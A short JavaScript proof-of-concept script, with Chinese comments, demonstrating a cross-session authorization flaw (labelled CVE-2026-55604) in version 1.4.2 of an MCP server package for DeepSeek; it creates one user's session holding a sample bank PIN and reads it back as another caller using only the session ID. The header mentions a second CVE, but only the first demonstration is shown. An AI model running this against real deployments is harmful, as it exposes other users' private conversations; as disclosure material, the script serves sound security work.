// PoC: CVE-2026-55604 + CVE-2026-55605 @arikusi/deepseek-mcp-server v1.4.2
process.env.DEEPSEEK_API_KEY = 'poc-dummy-key';
const { loadConfig } = await import('./src/package/dist/config.js');
const { SessionStore } = await import('./src/package/dist/session.js');
loadConfig();

console.log('=== PoC 1/2 · CVE-2026-55604 · SessionStore 跨会话越权(无主体绑定) ===');
const store = SessionStore.getInstance();
store.create('alice-session');
store.addMessages('alice-session', [{ role: 'user', content: '我的银行卡密码是 9622, 请帮我管理财务' }]);
const leaked = store.getMessages('alice-session');
console.log('[caller B] 从未创建该会话, 仅凭 sessionId 读到 A 的对话:');
console.log(JSON.stringify(leaked, null, 2));
console.log(leaked.length > 0 ? '[漏洞确认] 进程级单例 Map·sessionId 未绑定 caller 主体 → 越权读他人会话' : '[未复现]');
